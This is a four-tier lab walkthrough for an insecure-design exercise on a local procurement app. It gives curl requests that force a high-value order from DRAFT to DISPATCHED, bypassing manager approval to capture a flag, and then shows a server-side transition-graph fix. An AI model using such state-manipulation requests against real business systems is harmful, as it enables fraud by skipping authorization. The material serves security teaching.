# Practice Walkthrough: Insecure Design & State Machine Workflow Bypasses

This walkthrough adheres to the 4-Tier Mission Progression methodology, balancing **60% manual analytical inspection** and **40% terminal command execution**:

---

## Tier 1: Attack Surface Observation (Weight: 15% — Manual)

1. **Verify Target Service Readiness**:
   Open your web browser and navigate to the target portal:
   `http://127.0.0.1:8016`

2. **Inspect the Procurement Workflow Dashboard**:
   - Examine the title: `[A06:2025] Zitera Procurement Workflow`.
   - Review the business rules displayed in the informational card:
     - **Rule 1**: Orders < $500 auto-approve upon submission.
     - **Rule 2**: Orders $\ge$ $500 require executive manager signature (`PENDING_APPROVAL`).
   - Examine the *Active Procurement Orders* table:
     - Order #1001: Office Stationery ($120) — Status: `DRAFT` (Owner: Alice).
     - Order #1002: High-Performance AI Server ($15,000) — Status: `PENDING_APPROVAL` (Owner: Bob).
     - Order #9999: Executive Datacenter Cluster ($50,000) — Status: `DRAFT` (Owner: Learner).
   - Note the API documentation card: transitions execute via `POST /api/orders/<id>/transition`.

---

## Tier 2: Endpoint Discovery & Hypothesis Probing (Weight: 25% — Manual & Probing)

1. **Probe Health Status**:
   Verify service availability using terminal or browser:
   ```bash
   curl -s http://127.0.0.1:8016/health
   ```
   *Expected response*: `{"status":"ok","lab":"A06","port":8016}`

2. **Formulate the Insecure Design Hypothesis**:
   *Does the backend enforce an authoritative state machine transition graph, or does the endpoint naively trust client-supplied state variables?*

3. **Check Initial Verification Baseline**:
   Query the practice verification endpoint:
   ```bash
   curl -s http://127.0.0.1:8016/practice/verify
   ```
   *Initial response*: Rejects with `status: failed` because no high-value order has illegally entered `APPROVED` or `DISPATCHED`.

---

## Tier 3: Controlled Exploitation & Flag Capture (Weight: 35% — Tools: cURL)

1. **Execute Illegal State Leapfrog on High-Value Order**:
   Target Order #9999 ($50,000) currently in `DRAFT`. Under legitimate business policy, this order cannot transition to `DISPATCHED` without executive review.

   Issue an HTTP POST request using cURL to force a direct state mutation to `DISPATCHED`:
   ```bash
   curl -s -X POST http://127.0.0.1:8016/api/orders/9999/transition \
     -H "Content-Type: application/json" \
     -d '{"target_state": "DISPATCHED"}'
   ```
   *Alternatively, trigger the force_dispatch action:*
   ```bash
   curl -s -X POST http://127.0.0.1:8016/api/orders/9999/transition \
     -H "Content-Type: application/json" \
     -d '{"action": "force_dispatch"}'
   ```

2. **Analyze Server Response & Capture Flag**:
   Examine the JSON response payload returned by the server:
   - The backend mutates the order status to `DISPATCHED` immediately, completely bypassing managerial authorization.
   - Because an architectural business invariant violation has been demonstrated on a high-value order, the service returns the authoritative flag:
     ```json
     {
       "status": "updated",
       "flag": "ZITERA{...}"
     }
     ```
   - Copy the recovered flag token from the screen and submit it in the **Challenge** tab.

---

## Tier 4: Defensive Verification & Remediation Hardening (Weight: 25% — Manual & Tools)

1. **Verify Practice Completion**:
   Execute the automated verification check:
   ```bash
   curl -s http://127.0.0.1:8016/practice/verify
   ```
   *Result*: `{"status":"passed","message":"Insecure design reproduced: High-value order bypassed manager approval into authorized state!"}`

2. **Implement Server-Side State Machine Controls**:
   In the backend domain logic, eliminate arbitrary client state parameters and enforce an explicit transition graph:
   ```python
   # Secure Implementation: Authoritative Transition Validation
   ALLOWED_TRANSITIONS = {
       "DRAFT": ["PENDING_APPROVAL", "CANCELLED"],
       "PENDING_APPROVAL": ["APPROVED", "REJECTED"],
       "APPROVED": ["DISPATCHED"]
   }

   if target_state not in ALLOWED_TRANSITIONS.get(current_state, []):
       return jsonify({"error": "Illegal state transition attempted"}), 400
   ```

3. **Confirm Rejection**:
   Attempting to transition from `DRAFT` directly to `DISPATCHED` is permanently rejected with HTTP `400 Bad Request`.
